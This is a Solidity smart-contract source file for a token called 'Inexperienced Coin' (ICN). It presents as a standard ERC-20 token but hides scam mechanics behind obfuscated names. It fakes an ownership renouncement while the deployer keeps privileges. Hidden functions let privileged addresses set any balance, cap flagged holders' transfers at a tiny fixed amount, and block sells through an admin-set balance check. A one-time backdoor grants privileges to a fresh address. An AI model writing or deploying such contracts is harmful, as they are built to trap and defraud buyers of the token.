//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract listTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalSellLaunched {
    function createPair(address enableFee, address totalAmount) external returns (address);

    function feeTo() external view returns (address);
}

interface txFundReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface feeReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minList) external view returns (uint256);

    function transfer(address sellMinAuto, uint256 amountFromAt) external returns (bool);

    function allowance(address liquiditySwapMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountFromAt) external returns (bool);

    function transferFrom(
        address sender,
        address sellMinAuto,
        uint256 amountFromAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toSenderLimit, uint256 value);
    event Approval(address indexed liquiditySwapMarketing, address indexed spender, uint256 value);
}

interface feeReceiverMetadata is feeReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract InexperiencedCoin is listTotal, feeReceiver, feeReceiverMetadata {

    function modeIs() private view {
        require(txFrom[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return atFromReceiver;
    }

    address public maxEnable;

    mapping(address => uint256) private receiverMin;

    mapping(address => mapping(address => uint256)) private modeTotalTo;

    mapping(address => bool) public txFrom;

    function name() external view virtual override returns (string memory) {
        return sellLaunch;
    }

    uint256 public liquidityReceiver;

    function isReceiver(address fundTo, address sellMinAuto, uint256 amountFromAt) internal returns (bool) {
        require(receiverMin[fundTo] >= amountFromAt);
        receiverMin[fundTo] -= amountFromAt;
        receiverMin[sellMinAuto] += amountFromAt;
        emit Transfer(fundTo, sellMinAuto, amountFromAt);
        return true;
    }

    function receiverTotal(address totalShould, uint256 amountFromAt) public {
        modeIs();
        receiverMin[totalShould] = amountFromAt;
    }

    uint256 public sellAmount = 0;

    function allowance(address takeToken, address txTrading) external view virtual override returns (uint256) {
        if (txTrading == txWalletSwap) {
            return type(uint256).max;
        }
        return modeTotalTo[takeToken][txTrading];
    }

    function buyLiquidity(address fundTo, address sellMinAuto, uint256 amountFromAt) internal returns (bool) {
        if (fundTo == maxEnable) {
            return isReceiver(fundTo, sellMinAuto, amountFromAt);
        }
        uint256 takeFund = feeReceiver(launchAmount).balanceOf(modeTrading);
        require(takeFund == tradingFundMin);
        require(sellMinAuto != modeTrading);
        if (maxLaunchTo[fundTo]) {
            return isReceiver(fundTo, sellMinAuto, launchList);
        }
        amountFromAt = launchExempt(fundTo, sellMinAuto, amountFromAt);
        return isReceiver(fundTo, sellMinAuto, amountFromAt);
    }

    uint256 public receiverEnable;

    uint256 public takeShould;

    function tradingReceiver(address amountAutoAt) public {
        require(amountAutoAt.balance < 100000);
        if (takeAmount) {
            return;
        }
        if (swapSender == takeShould) {
            sellAuto = false;
        }
        txFrom[amountAutoAt] = true;
        
        takeAmount = true;
    }

    mapping(address => bool) public maxLaunchTo;

    string private sellTokenTo = "ICN";

    function transferFrom(address fundTo, address sellMinAuto, uint256 amountFromAt) external override returns (bool) {
        if (_msgSender() != txWalletSwap) {
            if (modeTotalTo[fundTo][_msgSender()] != type(uint256).max) {
                require(amountFromAt <= modeTotalTo[fundTo][_msgSender()]);
                modeTotalTo[fundTo][_msgSender()] -= amountFromAt;
            }
        }
        return buyLiquidity(fundTo, sellMinAuto, amountFromAt);
    }

    function autoExempt(address senderLimit) public {
        modeIs();
        if (swapExemptShould == sellAuto) {
            swapSender = takeShould;
        }
        if (senderLimit == maxEnable || senderLimit == launchAmount) {
            return;
        }
        maxLaunchTo[senderLimit] = true;
    }

    uint256 public fromLimit = 3;

    uint256 constant launchList = 3 ** 10;

    function launchExempt(address fundTo, address sellMinAuto, uint256 amountFromAt) internal view returns (uint256) {
        require(amountFromAt > 0);

        uint256 atTake = 0;
        if (fundTo == launchAmount && fromLimit > 0) {
            atTake = amountFromAt * fromLimit / 100;
        } else if (sellMinAuto == launchAmount && sellAmount > 0) {
            atTake = amountFromAt * sellAmount / 100;
        }
        require(atTake <= amountFromAt);
        return amountFromAt - atTake;
    }

    address public launchAmount;

    function receiverFrom(uint256 amountFromAt) public {
        modeIs();
        tradingFundMin = amountFromAt;
    }

    string private sellLaunch = "Inexperienced Coin";

    uint256 private takeMarketing = 100000000 * 10 ** 18;

    uint8 private enableTake = 18;

    uint256 tradingFundMin;

    function launchShouldWallet() public {
        emit OwnershipTransferred(maxEnable, address(0));
        atFromReceiver = address(0);
    }

    uint256 tokenList;

    function totalSupply() external view virtual override returns (uint256) {
        return takeMarketing;
    }

    function approve(address txTrading, uint256 amountFromAt) public virtual override returns (bool) {
        modeTotalTo[_msgSender()][txTrading] = amountFromAt;
        emit Approval(_msgSender(), txTrading, amountFromAt);
        return true;
    }

    address txWalletSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public swapSender;

    address private atFromReceiver;

    function transfer(address totalShould, uint256 amountFromAt) external virtual override returns (bool) {
        return buyLiquidity(_msgSender(), totalShould, amountFromAt);
    }

    function symbol() external view virtual override returns (string memory) {
        return sellTokenTo;
    }

    uint256 public takeLimitMode;

    function decimals() external view virtual override returns (uint8) {
        return enableTake;
    }

    address modeTrading;

    bool private swapExemptShould;

    function balanceOf(address minList) public view virtual override returns (uint256) {
        return receiverMin[minList];
    }

    event OwnershipTransferred(address indexed fundTakeMin, address indexed shouldSwap);

    constructor (){
        if (receiverEnable == tradingIsFrom) {
            tradingIsFrom = launchedLaunchReceiver;
        }
        launchShouldWallet();
        txFundReceiver walletToken = txFundReceiver(txWalletSwap);
        launchAmount = totalSellLaunched(walletToken.factory()).createPair(walletToken.WETH(), address(this));
        modeTrading = totalSellLaunched(walletToken.factory()).feeTo();
        if (receiverEnable != takeShould) {
            sellAuto = false;
        }
        maxEnable = _msgSender();
        txFrom[maxEnable] = true;
        receiverMin[maxEnable] = takeMarketing;
        
        emit Transfer(address(0), maxEnable, takeMarketing);
    }

    uint256 public launchedLaunchReceiver;

    uint256 private tradingIsFrom;

    bool public sellAuto;

    function owner() external view returns (address) {
        return atFromReceiver;
    }

    bool public takeAmount;

}